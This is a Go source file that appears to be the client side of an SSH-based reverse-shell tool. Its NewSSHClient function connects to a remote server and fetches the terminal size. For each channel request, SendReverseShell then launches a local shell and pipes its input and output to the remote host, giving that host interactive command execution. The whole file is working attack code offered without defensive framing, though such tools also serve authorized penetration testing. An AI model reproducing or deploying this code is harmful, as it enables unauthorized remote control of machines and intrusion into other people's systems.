package client

import (
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os/exec"

	"golang.org/x/crypto/ssh"
)

func (c *client) NewSSHClient(netConn net.Conn) {
	sshClientConn, newChan, reqChan, newCliErr := ssh.NewClientConn(netConn, c.serverAddr, c.sshConfig)
	if newCliErr != nil {
		c.Fatalf("%s\n", newCliErr)
		return
	}
	c.reqConnChannel = reqChan
	defer func() { _ = sshClientConn.Close() }()
	c.Debugf("Session %v\n", sshClientConn.SessionID())

	// Request Terminal Size from Server
	ok, termSizeBytes, termErr := sshClientConn.SendRequest("window-size", true, nil)
	if termErr != nil {
		c.Errorf("%s", termErr)
	}
	c.Debugf("Sent Request \"window-size\", received: \"%v\" from server with Payload: %s\n", ok, termSizeBytes)
	if unMarshalErr := json.Unmarshal(termSizeBytes, &c.interpreter.size); unMarshalErr != nil {
		c.Fatalf("%s", unMarshalErr)
	}

	for nc := range newChan {
		var chanReq <-chan *ssh.Request
		var acceptErr error
		c.sshChannel, chanReq, acceptErr = nc.Accept()
		if acceptErr != nil {
			c.Fatalf("%s", acceptErr)
		}
		for req := range chanReq {
			c.Debugf("Received Request Type: %s", req.Type)

			if err := c.SendReverseShell(); err != nil {
				c.Fatalf("Failed to Send Reverse Shell: %s", err)
			}
		}
	}
}

func (c *client) SendReverseShell() error {
	interpreter, err := setInterpreter()
	if err != nil {
		return err
	}

	cmd := exec.Command(interpreter.cmd, interpreter.args...)

	environment := []string{
		fmt.Sprintf("LINES=%d", c.interpreter.size.Rows),
		fmt.Sprintf("COLUMNS=%d", c.interpreter.size.Cols),
	}

	for _, envVar := range environment {
		cmd.Env = append(cmd.Environ(), envVar)
	}

	cmdIn, _ := cmd.StdinPipe()
	cmdOut, _ := cmd.StdoutPipe()
	cmdErr, _ := cmd.StderrPipe()

	go func() {
		_, err = io.Copy(c.sshChannel, cmdOut)
		if err != nil {
			c.Debugf("STOUT: %s", err)
		}
	}()

	go func() {
		_, err = io.Copy(c.sshChannel, cmdErr)
		if err != nil {
			c.Debugf("STDERR: %s", err)
		}
	}()

	go func() {
		_, err = io.Copy(cmdIn, c.sshChannel)
		if err != nil {
			c.Debugf("STDIN: %s", err)
		}
	}()

	go cmd.Run()

	return nil
}
